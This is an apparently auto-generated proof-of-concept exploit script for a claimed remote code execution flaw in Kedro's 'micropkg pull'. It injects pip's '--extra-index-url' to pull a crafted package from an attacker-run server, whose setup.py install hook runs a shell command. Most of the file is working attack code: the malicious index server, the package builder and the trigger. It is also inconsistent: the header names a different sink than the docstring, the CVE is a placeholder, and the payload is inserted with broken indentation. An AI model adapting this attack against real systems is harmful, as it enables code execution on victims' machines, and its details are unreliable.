#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: rce-002
# Sink: _describe_git
# Auto-generated — run with: python3 rce_cli_manifest__describe_git.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Kedro micropkg pull RCE (CVE-XXXX-XXXX).

Vulnerability: The `_unpack_sdist` function in Kedro's micropkg CLI passes a
user-controlled `package_path` directly to `pip download` via subprocess without
sanitization. By crafting a malicious package path that includes pip options like
`--extra-index-url` pointing to an attacker-controlled PyPI server, an attacker
can cause pip to download and execute arbitrary code during package installation.

This PoC demonstrates the vulnerability by:
1. Setting up a malicious PyPI server that serves a crafted package
2. Triggering Kedro's `micropkg pull` with a package path that includes
   `--extra-index-url` pointing to our malicious server
3. The malicious package executes a benign payload (creates /tmp/poc_success.txt)

Usage:
    python3 poc_kedro_rce.py [--target TARGET_URL] [--lhost YOUR_IP] [--lport 8080]

Requirements:
    - Python 3.6+
    - Kedro installed (pip install kedro)
    - Network access to the target Kedro installation
"""

import argparse
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path

# Configuration
DEFAULT_LHOST = "127.0.0.1"
DEFAULT_LPORT = 8080
PAYLOAD_FILE = "/tmp/poc_success.txt"
MALICIOUS_PACKAGE_NAME = "poc-exploit-package"

# Benign payload that creates a marker file
BENIGN_PAYLOAD = f"""
import os
os.system("touch {PAYLOAD_FILE}")
print("[POC] Exploit executed successfully!")
"""


class MaliciousPackageServer(SimpleHTTPRequestHandler):
    """HTTP server that serves a malicious Python package."""
    
    def do_GET(self):
        """Handle GET requests - serve our malicious package."""
        if self.path.endswith(".tar.gz"):
            # Serve the malicious package
            self.send_response(200)
            self.send_header("Content-type", "application/gzip")
            self.end_headers()
            with open(self.server.package_path, "rb") as f:
                self.wfile.write(f.read())
        elif self.path.endswith("/simple/"):
            # Serve a simple index page
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(f"""
            <html><body>
            <a href="/{MALICIOUS_PACKAGE_NAME}/">{MALICIOUS_PACKAGE_NAME}</a>
            </body></html>
            """.encode())
        elif f"/{MALICIOUS_PACKAGE_NAME}/" in self.path:
            # Serve package index
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(f"""
            <html><body>
            <a href="/{MALICIOUS_PACKAGE_NAME}-1.0.0.tar.gz">
                {MALICIOUS_PACKAGE_NAME}-1.0.0.tar.gz
            </a>
            </body></html>
            """.encode())
        else:
            self.send_response(404)
            self.end_headers()


def create_malicious_package():
    """Create a malicious Python package with our payload."""
    tmp_dir = tempfile.mkdtemp()
    package_dir = Path(tmp_dir) / MALICIOUS_PACKAGE_NAME
    package_dir.mkdir(parents=True)
    
    # Create setup.py with malicious code
    setup_py = package_dir / "setup.py"
    setup_py.write_text(f"""
from setuptools import setup
from setuptools.command.install import install

class MaliciousInstall(install):
    def run(self):
        {BENIGN_PAYLOAD}
        install.run(self)

setup(
    name="{MALICIOUS_PACKAGE_NAME}",
    version="1.0.0",
    cmdclass={{'install': MaliciousInstall}},
)
""")
    
    # Create a minimal __init__.py
    init_py = package_dir / "__init__.py"
    init_py.write_text("# Malicious package")
    
    # Create the tar.gz archive
    archive_path = Path(tmp_dir) / f"{MALICIOUS_PACKAGE_NAME}-1.0.0.tar.gz"
    subprocess.run(
        ["tar", "-czf", str(archive_path), "-C", tmp_dir, MALICIOUS_PACKAGE_NAME],
        check=True,
        capture_output=True
    )
    
    return tmp_dir, archive_path


def start_malicious_server(archive_path, host, port):
    """Start HTTP server serving the malicious package."""
    server = HTTPServer((host, port), MaliciousPackageServer)
    server.package_path = str(archive_path)
    
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()
    
    print(f"[*] Malicious package server started on http://{host}:{port}")
    print(f"[*] Serving malicious package: {archive_path}")
    return server


def trigger_exploit(target_url, lhost, lport):
    """
    Trigger the Kedro micropkg pull vulnerability.
    
    The exploit works by providing a package_path that includes pip options
    to redirect package resolution to our malicious server.
    """
    # Craft the malicious package path with pip options injection
    # The package_path is passed directly to pip download, so we can inject
    # --extra-index-url to point to our malicious server
    malicious_path = (
        f"--extra-index-url http://{lhost}:{lport}/simple/ "
        f"{MALICIOUS_PACKAGE_NAME}"
    )
    
    print(f"[*] Triggering Kedro micropkg pull with malicious package path:")
    print(f"    {malicious_path}")
    
    # Execute the Kedro command
    cmd = [
        sys.executable, "-m", "kedro", "micropkg", "pull",
        "--package-path", malicious_path
    ]
    
    print(f"[*] Running command: {' '.join(cmd)}")
    
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30
        )
        print(f"[*] Command stdout: {result.stdout}")
        print(f"[*] Command stderr: {result.stderr}")
        print(f"[*] Return code: {result.returncode}")
    except subprocess.TimeoutExpired:
        print("[!] Command timed out")
    except FileNotFoundError:
        print("[!] Kedro not found. Make sure it's installed.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error running command: {e}")
        sys.exit(1)


def check_exploit_success():
    """Check if the exploit was successful by looking for the marker file."""
    if os.path.exists(PAYLOAD_FILE):
        print(f"[+] Exploit successful! Marker file created: {PAYLOAD_FILE}")
        # Clean up
        os.remove(PAYLOAD_FILE)
        return True
    else:
        print("[-] Exploit may have failed - marker file not found")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for Kedro micropkg pull RCE vulnerability"
    )
    parser.add_argument(
        "--lhost",
        default=DEFAULT_LHOST,
        help=f"Local IP for malicious server (default: {DEFAULT_LHOST})"
    )
    parser.add_argument(
        "--lport",
        type=int,
        default=DEFAULT_LPORT,
        help=f"Local port for malicious server (default: {DEFAULT_LPORT})"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8080",
        help="Target Kedro installation URL (not directly used)"
    )
    
    args = parser.parse_args()
    
    print("[*] Kedro micropkg pull RCE PoC")
    print("[*] ============================")
    print(f"[*] Target: {args.target}")
    print(f"[*] LHOST: {args.lhost}:{args.lport}")
    
    # Step 1: Create malicious package
    print("\n[*] Step 1: Creating malicious package...")
    tmp_dir, archive_path = create_malicious_package()
    print(f"[*] Malicious package created at: {archive_path}")
    
    # Step 2: Start malicious server
    print("\n[*] Step 2: Starting malicious package server...")
    server = start_malicious_server(archive_path, args.lhost, args.lport)
    
    # Step 3: Trigger the exploit
    print("\n[*] Step 3: Triggering exploit...")
    trigger_exploit(args.target, args.lhost, args.lport)
    
    # Step 4: Check if exploit succeeded
    print("\n[*] Step 4: Checking exploit success...")
    time.sleep(2)  # Give time for any async operations
    success = check_exploit_success()
    
    # Cleanup
    print("\n[*] Cleaning up...")
    server.shutdown()
    shutil.rmtree(tmp_dir, ignore_errors=True)
    
    if success:
        print("\n[+] PoC completed successfully!")
        print("[+] The vulnerability is confirmed exploitable.")
    else:
        print("\n[-] PoC may have failed. Check the output above for errors.")
        print("[-] Possible issues:")
        print("  - Kedro version may not be vulnerable")
        print("  - Network connectivity issues")
        print("  - The malicious server may not be reachable")
        sys.exit(1)


if __name__ == "__main__":
    main()
